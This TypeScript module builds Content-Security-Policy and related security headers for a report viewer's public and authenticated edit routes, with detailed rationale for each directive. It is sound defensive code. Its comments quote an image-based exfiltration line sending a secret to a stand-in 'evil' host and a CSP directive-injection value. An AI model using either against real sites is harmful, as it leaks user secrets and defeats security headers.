import { HSTS, PERMISSIONS_POLICY, reportToHeader, resolveReportToUrl } from "./permissions-policy";
import type { EditViewHeadersOptions, SecureHeadersOptions } from "./types";

// The shared BASE source lists for the viewer-origin CSP profiles (the
// public `viewHeaders()` and the edit-route `editViewHeaders()`, ADR-0063
// Phase 3) — extracted so the two profiles can't silently drift apart on the
// directives that are supposed to stay identical. Each profile still
// assembles its OWN `script-src`/`style-src`/`connect-src` (and, for the edit
// profile, `frame-src`) inline, since those are exactly the directives the
// two profiles are allowed to differ on.
//
// `defaultSrc`/`imgSrc`/`baseUri`/`formAction`/`objectSrc`/`workerSrc`/
// `reportTo` are used byte-for-byte by every profile. Two entries are NOT,
// since ADR-0088: the public enforcing profile appends the Viewer CSP
// allowlist to `fontSrc`, and replaces `frameAncestors` with
// `frame-ancestors 'self'`. Both remain byte-for-byte in the report-only
// shadow policy and the edit profile, which is why they still live here.
const CSP_SHARED = {
  defaultSrc: "default-src 'self'",
  imgSrc: "img-src 'self' data: blob:",
  fontSrc: "font-src 'self' data:",
  frameAncestors: "frame-ancestors 'none'",
  baseUri: "base-uri 'none'",
  formAction: "form-action 'self'",
  objectSrc: "object-src 'none'",
  workerSrc: "worker-src 'self'",
  reportTo: "report-to csp-endpoint",
} as const;

/**
 * The **Viewer CSP allowlist** (ADR-0088, amending ADR-013) — the named set of
 * external hosts the PUBLIC viewer profile lets a report load passive assets
 * from, so a self-contained agent-authored artifact renders here the way it
 * renders where it was authored ("artifact parity"): the designed typeface,
 * the charting library. Without it a report silently degrades to a fallback
 * serif with a dead chart, and nothing surfaces that to its author.
 *
 * ONE constant, keyed by the directive each host belongs to, and exported so
 * the unit tests and the live `security-headers` CI gate assert against it
 * rather than restating its hosts. Adding a fifth host is an edit to this
 * object — visible in a diff, reviewable as the security decision it is —
 * never a string spliced into a policy somewhere below.
 *
 * SECURITY — what this deliberately is NOT: it is a *loading* allowlist only.
 * Every OUTBOUND directive stays pinned to the viewer origin — `connect-src
 * 'self'` (the directive that keeps exfiltration blocked, spec threat #3),
 * `img-src 'self' data: blob:` (a wildcard image source IS an exfil channel:
 * `new Image().src = "https://evil/?" + secret` defeats connect-src without
 * ever using connect), `form-action 'self'`, `worker-src 'self'`. The second,
 * `sandbox` CSP header is untouched too, so allowlisted script runs in the
 * same opaque origin — `allow-same-origin` still withheld — that the report's
 * own inline script already runs in. Widening `script-src` does not widen the
 * sandbox. Applies to `viewHeaders()` alone: the report-only shadow policy
 * stays strict (it is the instrument that tells us what reports reach for),
 * and the ADR-0063 `/edit` profile carries no allowlist at all.
 */
export const VIEW_CSP_ALLOWLIST = {
  /** Google Fonts serves the `@font-face` CSS from here… */
  styleSrc: ["https://fonts.googleapis.com"],
  /** …and the woff2 files that CSS points at from here. Either alone renders nothing. */
  fontSrc: ["https://fonts.gstatic.com"],
  /** The two immutably-versioned CDNs the artifact ecosystem standardizes on. */
  scriptSrc: ["https://cdnjs.cloudflare.com", "https://cdn.jsdelivr.net/npm/"],
} as const satisfies Record<string, readonly string[]>;

/** Append allowlisted hosts to a directive's own base source list. */
const withAllowlist = (directive: string, hosts: readonly string[]): string =>
  [directive, ...hosts].join(" ");

const VIEW_CSP = [
  CSP_SHARED.defaultSrc,
  withAllowlist("script-src 'self' 'unsafe-inline'", VIEW_CSP_ALLOWLIST.scriptSrc),
  withAllowlist("style-src 'self' 'unsafe-inline'", VIEW_CSP_ALLOWLIST.styleSrc),
  CSP_SHARED.imgSrc,
  withAllowlist(CSP_SHARED.fontSrc, VIEW_CSP_ALLOWLIST.fontSrc),
  "connect-src 'self'",
  // ADR-0088: 'self', not CSP_SHARED's 'none' — the viewer origin may frame
  // its own reports (a preview pane, a side-by-side). `app.<domain>` is a
  // different origin and an attacker's page is not 'self', so clickjacking a
  // report stays impossible. The edit profile keeps `frame-ancestors 'none'`.
  "frame-ancestors 'self'",
  CSP_SHARED.baseUri,
  CSP_SHARED.formAction,
  CSP_SHARED.objectSrc,
  CSP_SHARED.workerSrc,
  CSP_SHARED.reportTo,
].join("; ");

const VIEW_CSP_SANDBOX =
  "sandbox allow-forms allow-scripts allow-popups allow-popups-to-escape-sandbox";

const VIEW_CSP_REPORT_ONLY = [
  CSP_SHARED.defaultSrc,
  "script-src 'self'",
  "style-src 'self'",
  CSP_SHARED.imgSrc,
  CSP_SHARED.fontSrc,
  "connect-src 'self'",
  CSP_SHARED.frameAncestors,
  CSP_SHARED.baseUri,
  CSP_SHARED.formAction,
  CSP_SHARED.objectSrc,
  CSP_SHARED.workerSrc,
  CSP_SHARED.reportTo,
].join("; ");

/**
 * Validate + reduce `appOrigin` to a bare origin token (`scheme://host[:port]`)
 * before it's interpolated into `connect-src`. SECURITY (claude-review #181): a
 * raw string spliced into a CSP is a directive-injection vector — an `appOrigin`
 * like `"https://x.com; default-src *"` would inject `default-src *` even though
 * `connect-src` never literally becomes `'*'`. Parsing with `new URL` and
 * returning `.origin` structurally prevents this: `.origin` is always a clean
 * token with NO path/query/fragment, whitespace, or `;`. Throws on a malformed
 * URL, a non-http(s) scheme (blocks `javascript:`/`data:`), embedded
 * credentials, or a non-local http origin (prod must be https; http is allowed
 * only for localhost dev). `appOrigin` is operator config (env `APP_ORIGIN`),
 * not user input, but a value flowing into a security header is validated at the
 * boundary regardless.
 */
function normalizeOrigin(origin: string): string {
  let url: URL;
  try {
    url = new URL(origin);
  } catch {
    throw new Error(`editViewHeaders: appOrigin is not a valid URL: ${JSON.stringify(origin)}`);
  }
  if (url.username || url.password) {
    throw new Error("editViewHeaders: appOrigin must not carry credentials");
  }
  const isLocal = url.hostname === "localhost" || url.hostname === "127.0.0.1";
  if (url.protocol !== "https:" && !(url.protocol === "http:" && isLocal)) {
    throw new Error(
      `editViewHeaders: appOrigin must be https (http allowed only for localhost), got ${JSON.stringify(origin)}`,
    );
  }
  return url.origin; // clean scheme://host[:port] — no path/query/fragment/`;`/whitespace
}

/**
 * ADR-0063 Phase 3 (Decisions 1-2): the two viewer-origin CSP profiles,
 * relative to each other.
 *
 * `viewHeaders()` (`GET /<slug>`, public, unauthenticated): the top-level
 * document IS the untrusted report — the enforcing CSP above is paired with
 * a second, separate `sandbox` CSP header (`VIEW_CSP_SANDBOX`) that sandboxes
 * the whole top-level document. That's the entire isolation model for the
 * public route, and it is untouched by this profile.
 *
 * `editViewHeaders()` (`GET /<slug>/edit`, authenticated, built below): the
 * top-level document is instead the TRUSTED first-party editor app (Remix/
 * React) — it must NOT be sandboxed, because it needs same-origin DOM/
 * storage access and to call the app-origin API. This is the single biggest
 * relaxation vs the public profile. Containment for the untrusted report
 * being edited does not depend on the top-level CSP at all: the report is
 * rendered inside the editor's OWN sandboxed `srcDoc` iframe
 * (`sandbox="allow-same-origin"`, no `allow-scripts`), which carries its own,
 * independently enforced, more restrictive `<meta>` CSP
 * (`default-src 'none'; style-src 'unsafe-inline'; img-src data: …` — see
 * apps/app/app/editor/iframe-document.ts). So the untrusted bytes stay
 * contained by the iframe's own policy, not by anything this function sets.
 *
 * Every other directive is either carried over unchanged from the public
 * profile (via `CSP_SHARED` above) or tightened, never loosened further:
 * - `connect-src 'self' <appOrigin>` — widened by exactly one explicit
 *   origin (the app-origin API the edit token authenticates against), never
 *   `'*'`.
 * - `script-src 'self'` — NOT loosened to `'unsafe-inline'`. Mirrors
 *   `appHeaders()` (packages/headers/src/app-headers.ts), which already
 *   ships `script-src 'self'` with no `'unsafe-inline'` for the SAME
 *   Remix/React stack on the dashboard origin — i.e. this app's own Remix
 *   build already doesn't need an inline-script allowance to hydrate. If a
 *   future editor-bundle build step ever needs one, prefer a per-response
 *   nonce (`'nonce-<value>'`) over `'unsafe-inline'`, and flag it for
 *   `/security-review` before shipping — not implemented here since it
 *   isn't needed.
 * - `frame-src 'self'` — NEW directive vs the public profile (which has
 *   none). Required so the editor's own report iframe (`srcDoc`, same
 *   document, sandbox="allow-same-origin") is permitted to render at all;
 *   `'self'` is the minimal source list a `srcDoc` iframe matches against
 *   (browsers resolve a `srcDoc` frame's effective origin to its embedder's
 *   for CSP `frame-src` purposes) — no `blob:`/`data:` needed since the
 *   iframe is never given a `blob:`/`data:` URL, only `srcDoc` markup.
 * - `Cache-Control: no-store` (vs the public route's
 *   `private, max-age=60, must-revalidate`) — the edit route is
 *   authenticated and per-user; nothing about it should be cached, even
 *   privately, across sessions/devices.
 * - `style-src 'self' 'unsafe-inline'` (for Tailwind), `font-src 'self'
 *   data:` and `frame-ancestors 'none'` — since ADR-0088 these are three
 *   directives where the edit profile is NARROWER than the public one, not
 *   identical to it: the public profile appends the Viewer CSP allowlist to
 *   `style-src`/`font-src` and relaxes `frame-ancestors` to `'self'`. The
 *   edit route is the TRUSTED first-party editor, not an agent-authored
 *   artifact that needs parity with where it was generated, so it carries no
 *   allowlist and stays wholly unframeable. Asserted by the leak tests in
 *   view-headers.test.ts ("no allowlist host reaches the edit profile").
 * - Everything else (`default-src`, `img-src`, `base-uri 'none'`,
 *   `form-action 'self'`, `object-src 'none'`, `worker-src 'self'`, the
 *   report-only shadow policy, COOP/CORP/
 *   Origin-Agent-Cluster/Referrer-Policy/Permissions-Policy/nosniff/HSTS/
 *   Report-To) is IDENTICAL to the public profile — the edit route is
 *   additive, not a general loosening (ADR-0063 Decision 1).
 *
 * OPEN for `/security-review` (flagged, not resolved here): (1) whether
 * "top-level document not sandboxed" is acceptable given the editor is a
 * first-party-JS-bearing route added to an origin whose entire prior model
 * was "nothing here to compromise" (ADR-0063 Consequences); (2) confirm in
 * a real browser that `frame-src 'self'` is sufficient for the `srcDoc`
 * iframe in every target browser (spec behavior for `srcDoc` + `frame-src`
 * has had inconsistent implementations historically) before this profile is
 * wired to a route (Phase 4).
 */
function editCspDirectives(appOrigin: string): readonly string[] {
  const origin = normalizeOrigin(appOrigin);
  return [
    CSP_SHARED.defaultSrc,
    "script-src 'self'",
    "style-src 'self' 'unsafe-inline'",
    CSP_SHARED.imgSrc,
    CSP_SHARED.fontSrc,
    `connect-src 'self' ${origin}`,
    "frame-src 'self'",
    CSP_SHARED.frameAncestors,
    CSP_SHARED.baseUri,
    CSP_SHARED.formAction,
    CSP_SHARED.objectSrc,
    CSP_SHARED.workerSrc,
    CSP_SHARED.reportTo,
  ];
}

function buildEditCsp(appOrigin: string): string {
  return editCspDirectives(appOrigin).join("; ");
}

/** Report-only shadow for the edit profile: same shape as the enforcing
 *  policy, but stricter on `style-src` (drops `'unsafe-inline'`) — mirrors
 *  `VIEW_CSP_REPORT_ONLY`'s relationship to `VIEW_CSP`. `script-src` is
 *  already `'self'`-only in the enforcing edit policy, so there's nothing
 *  stricter left to shadow there. */
function buildEditCspReportOnly(appOrigin: string): string {
  const origin = normalizeOrigin(appOrigin);
  return [
    CSP_SHARED.defaultSrc,
    "script-src 'self'",
    "style-src 'self'",
    CSP_SHARED.imgSrc,
    CSP_SHARED.fontSrc,
    `connect-src 'self' ${origin}`,
    "frame-src 'self'",
    CSP_SHARED.frameAncestors,
    CSP_SHARED.baseUri,
    CSP_SHARED.formAction,
    CSP_SHARED.objectSrc,
    CSP_SHARED.workerSrc,
    CSP_SHARED.reportTo,
  ].join("; ");
}

/**
 * Security headers for the viewer origin (`view.<domain>`) per ADR-013.
 * Returns a fresh `Headers` so callers can override per-response (e.g.
 * `/health` overrides `Cache-Control` to `no-store`).
 *
 * Two CSP headers are appended — the enforcing policy and a separate
 * `sandbox` policy applied to the top-level document. A stricter
 * report-only policy ships alongside via `Content-Security-Policy-Report-Only`
 * so we can watch what would break before tightening the enforcing one.
 */
export function viewHeaders(opts: SecureHeadersOptions = {}): Headers {
  const h = new Headers();
  h.append("Content-Security-Policy", VIEW_CSP);
  h.append("Content-Security-Policy", VIEW_CSP_SANDBOX);
  h.set("Content-Security-Policy-Report-Only", VIEW_CSP_REPORT_ONLY);
  h.set("Cross-Origin-Opener-Policy", "same-origin");
  h.set("Cross-Origin-Resource-Policy", "same-site");
  h.set("Origin-Agent-Cluster", "?1");
  h.set("Referrer-Policy", "no-referrer");
  h.set("Permissions-Policy", PERMISSIONS_POLICY);
  h.set("X-Content-Type-Options", "nosniff");
  h.set("Cache-Control", "private, max-age=60, must-revalidate");
  h.set("Strict-Transport-Security", HSTS);
  h.set("Report-To", reportToHeader(resolveReportToUrl(opts.reportToUrl)));
  return h;
}

/**
 * Security headers for the viewer origin's SECOND, authenticated CSP
 * profile (ADR-0063 Phase 3): `GET /<slug>/edit`. See the doc comment above
 * `editCspDirectives` for the full relaxation-by-relaxation rationale
 * against `viewHeaders()`'s public profile. Not wired to any route yet
 * (Phase 4) — this is the pure header builder only.
 */
export function editViewHeaders(opts: EditViewHeadersOptions): Headers {
  const h = new Headers();
  // Single `Content-Security-Policy` value (`.set`, not `.append`) — unlike
  // `viewHeaders()`, there is deliberately no second, `sandbox`-directive
  // CSP header here (see the rationale above `editCspDirectives`).
  h.set("Content-Security-Policy", buildEditCsp(opts.appOrigin));
  h.set("Content-Security-Policy-Report-Only", buildEditCspReportOnly(opts.appOrigin));
  h.set("Cross-Origin-Opener-Policy", "same-origin");
  h.set("Cross-Origin-Resource-Policy", "same-site");
  h.set("Origin-Agent-Cluster", "?1");
  h.set("Referrer-Policy", "no-referrer");
  h.set("Permissions-Policy", PERMISSIONS_POLICY);
  h.set("X-Content-Type-Options", "nosniff");
  // Authenticated, per-user route — never cached, not even privately
  // (contrast the public route's `private, max-age=60, must-revalidate`).
  h.set("Cache-Control", "no-store");
  h.set("Strict-Transport-Security", HSTS);
  h.set("Report-To", reportToHeader(resolveReportToUrl(opts.reportToUrl)));
  return h;
}
